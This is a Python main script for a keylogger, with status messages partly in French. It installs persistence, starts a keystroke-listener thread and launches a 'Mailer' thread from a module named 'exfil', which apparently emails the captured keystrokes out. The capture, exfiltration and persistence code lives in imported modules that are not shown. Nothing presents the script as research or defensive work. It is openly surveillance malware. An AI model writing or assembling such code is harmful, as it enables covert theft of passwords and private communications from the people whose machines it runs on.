import threading
import time
import sys


from storage.logger import init_db
from core.listener import KeyLogger
from exfil.mailer import Mailer
from persistence import install as install_persistence


def main():
    print("=" * 40)
    print("   demarage du key")
    print("=" * 40)


    install_persistence()

    init_db()
    print("[+] DB ")


    kl = KeyLogger()
    listener_thread = threading.Thread(target=kl.start)
    listener_thread.daemon = True
    listener_thread.start()
    print("[+] Listener")

    mailer = Mailer()
    mailer_thread = threading.Thread(target=mailer.start)
    mailer_thread.daemon = True
    mailer_thread.start()
    print("[+] Mailer démarré")

    print("[*] sa marche\n")
    try:
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[*] stop en cours...")
        kl.stop()
        mailer.stop()
        print("[*] stop proprement.")
        sys.exit(0)


if __name__ == "__main__":
    main()